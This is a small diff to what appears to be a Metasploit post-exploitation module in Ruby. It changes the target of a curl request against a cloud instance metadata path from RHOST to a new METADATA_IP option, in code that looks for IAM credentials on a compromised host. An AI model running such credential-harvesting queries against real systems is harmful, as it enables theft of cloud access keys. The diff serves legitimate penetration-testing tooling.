@@ -13,7 +13,7 @@ module Metasploit
           # TODO: do it for windows/generic way
           cmd_out = cmd_exec("curl --version")
           if cmd_out =~ /^curl \d/
-            url = "http://#{datastore['RHOST']}/2012-01-12/meta-data/"
+            url = "http://#{datastore['METADATA_IP']}/2012-01-12/meta-data/"
             print_status("#{peer} - looking for creds...")
             resp = cmd_exec("curl #{url}")
             if resp =~ /^iam.*/
